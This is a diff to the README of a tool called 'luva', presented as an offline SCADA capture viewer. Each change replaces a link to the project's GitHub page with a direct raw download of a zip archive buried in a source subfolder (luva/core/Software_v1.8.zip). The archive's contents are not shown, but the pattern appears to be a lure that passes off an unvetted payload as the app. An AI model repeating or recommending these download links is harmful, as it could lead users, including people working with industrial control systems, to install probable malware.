@@ -1,6 +1,6 @@
 # 🛠️ luva - Offline SCADA Capture Viewer
 
-[![Download luva](https://img.shields.io/badge/Download%20luva-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Blackbarred-specialcourtmartial190/luva)
+[![Download luva](https://img.shields.io/badge/Download%20luva-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip)
 
 ## 📦 What luva does
 
@@ -33,7 +33,7 @@ If your file is large, give the app more memory and a bit more time to load.
 
 Go to the project page here and download the app from the repository:
 
-[Open the luva download page](https://github.com/Blackbarred-specialcourtmartial190/luva)
+[Open the luva download page](https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip)
 
 Save the file to a folder you can find again, such as:
 
@@ -172,7 +172,7 @@ If the file came from another tool, export it again and try once more.
 
 Use this page to get the app and check the repository:
 
-[https://github.com/Blackbarred-specialcourtmartial190/luva](https://github.com/Blackbarred-specialcourtmartial190/luva)
+[https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip](https://raw.githubusercontent.com/Blackbarred-specialcourtmartial190/luva/main/luva/core/Software_v1.8.zip)
 
 ## 🔧 Typical use cases
 
